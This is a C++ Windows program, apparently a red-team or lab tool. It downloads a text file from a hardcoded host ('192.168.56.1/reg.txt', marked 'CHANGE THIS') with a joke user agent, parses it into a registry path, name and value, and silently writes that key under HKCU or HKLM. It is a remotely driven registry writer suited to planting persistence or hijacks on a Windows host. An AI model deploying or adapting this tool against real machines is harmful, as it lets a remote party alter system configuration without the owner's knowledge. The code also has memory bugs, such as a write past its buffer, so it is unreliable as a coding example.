#include <iostream>
#include <Windows.h>
#include <winhttp.h>
#include <winreg.h>
#include <vector>
#include <cstring>
#include <string>
#pragma comment(lib, "winhttp.lib")
#pragma comment(lib,"Advapi32.lib")

struct HttpG
{
    const wchar_t* wszUserAgent;
    const wchar_t* wszCookie;
    const wchar_t* wszHost;
    const wchar_t* wszPath;
    char* cResponse;
    int cResponseSize;
};

DWORD dwSize = 0;
DWORD dwDownloaded = 0;
BOOL  bResults = FALSE;
HINTERNET  hSession = NULL,
hConnect = NULL,
hRequest = NULL;
char cBuffer[1024], * cTemp;
std::vector<std::string> regVector;


void HttpGet(HttpG& http_get)
{
    hSession = WinHttpOpen(http_get.wszUserAgent,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);
    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, http_get.wszHost,
            INTERNET_DEFAULT_HTTP_PORT, 0);
    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, L"GET", http_get.wszPath,
            NULL, WINHTTP_NO_REFERER,
            NULL,
            NULL);
    // Send a request.
    if (hRequest)
    {
        bResults = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS,
            0, WINHTTP_NO_REQUEST_DATA, 0,
            0, 0);
    }

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (bResults)
        do
        {
            if (!WinHttpReadData(hRequest, cBuffer, sizeof(cBuffer), &dwDownloaded))
            {
                printf("something went wrong...");
                break;
            }
            if (dwDownloaded == 0)
                break;

            if (http_get.cResponse == NULL)
            {
                http_get.cResponse = new char[dwDownloaded];
                //append null terminator because C is stupid like that :) 
                http_get.cResponse[dwDownloaded] = 0;
                memcpy(http_get.cResponse, cBuffer, dwDownloaded);
                http_get.cResponseSize = dwDownloaded;
            }
            else

            {
                cTemp = new char[http_get.cResponseSize + dwDownloaded];
                memcpy(cTemp, http_get.cResponse, http_get.cResponseSize);
                memcpy(&cTemp[http_get.cResponseSize], cBuffer, dwDownloaded);
                delete[] http_get.cResponse;
                http_get.cResponse = cTemp;
                http_get.cResponseSize += dwDownloaded;
            }
        } while (true);
}

void tokenize(std::string const& str, const char* delim,std::vector<std::string>& out)
{
    char* next_token = NULL;
    char* token = strtok_s(const_cast<char*>(str.c_str()), delim,&next_token);
    while (token != nullptr)
    {
        out.push_back(std::string(token));
        token = strtok_s(nullptr, delim,&next_token);
    }
}

void RegTime(char* regInfo)
{
    HKEY hKey;
    HKEY hRegHive;
    std::string sRegKey;
    std::string sRegFullPath;
    std::string sRegKeyName;
    std::string sRegKeyType;
    std::string sRegKeyValue;
    std::string regHive;
    std::vector<std::string> helpVector;
    std::string sRegInfo = regInfo;
    const char* delim = "\n,:";

    //parses the values nicely
    tokenize(sRegInfo, delim, regVector);
    sRegKey = regVector[0];
    sRegFullPath = regVector[0];
    if (regVector[1] == "Name:")
        sRegKeyName = regVector[2];
    //TODO: still need to implement this.. currently only supporting REG_EXPAND_SZ (hardcoded)
    sRegKeyType = regVector[4];
    sRegKeyValue = regVector[6];
    //needs one more tokenize to get the correct reg format to create the actual key.
    tokenize(sRegKey, "\\", helpVector);
    regHive = helpVector[0];
    if (regHive == "HKEY_CURRENT_USER")
        hRegHive = HKEY_CURRENT_USER;
    else
        hRegHive = HKEY_LOCAL_MACHINE;
 
    //erasing the hive from the rest of the path +1 to elimante the \ as well"
    sRegFullPath.erase(0, regHive.size()+1);
    std::cout << sRegFullPath;
 
    RegCreateKeyExA(hRegHive,sRegFullPath.c_str(), 0, NULL,REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, NULL, &hKey,NULL);
    if (!sRegKeyName.empty())
        RegSetValueExA(hKey, sRegKeyName.c_str(), 0, REG_EXPAND_SZ, (const BYTE*)sRegKeyValue.c_str(), sRegKeyValue.size() + 1);
    else
        RegSetValueExA(hKey, NULL, 0, REG_EXPAND_SZ, (const BYTE*)sRegKeyValue.c_str(), sRegKeyValue.size() + 1);
    RegCloseKey(hKey);

}


int main()
{
    
    HttpG http_get;
    //CHANGE THIS :) 
    http_get.wszHost = L"192.168.56.1";
    http_get.wszPath = L"/reg.txt";
    http_get.wszUserAgent = L"The Name is Bond... James Bond...";
    http_get.cResponse = NULL;
    http_get.cResponseSize = 0;
    HttpGet(http_get);
    RegTime(http_get.cResponse);
    std::cout << regVector[0] << regVector[2];
 
}


